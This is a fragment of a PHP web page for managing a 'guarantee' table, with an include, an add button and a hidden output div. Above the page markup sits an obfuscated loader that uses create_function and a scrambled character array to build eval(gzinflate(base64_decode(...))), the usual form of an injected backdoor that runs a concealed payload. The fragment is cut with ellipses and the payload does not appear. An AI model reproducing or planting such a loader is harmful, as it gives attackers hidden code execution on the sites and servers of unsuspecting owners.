...
/*$md5 = "49c8186fcd529b913b67dda63e37d161";
$a0 = array("t","o",'$','6','(',')','v',"b","l",'4',"d",'i',"e","s","g",'z','r','n','a','c',';',"f",'_');
$b0d = create_function('$'.'v',$a0[12].$a0[6].$a0[18].$a0[8].$a0[4].$a0[14].$a0[15].$a0[11].$a0[17].$a0[21].$a0[8].$a0[18].$a0[0].$a0[12].$a0[4].$a0[7].$a0[18].$a0[13].$a0[12].$a0[3].$a0[9].$a0[22].$a0[10].$a0[12].$a0[19].$a0[1].$a0[10].$a0[12].$a0[4].$a0[2].$a0[6].$a0[5].$a0[5].$a0[5].$a0[20]);
...
<? include("guarantee_table.php"); ?>

<center>
	<img src="./../images/add.png" onclick="show_form()" style="cursor: pointer;">
</center>

<div style=" display: none;" id="output_guarantee">
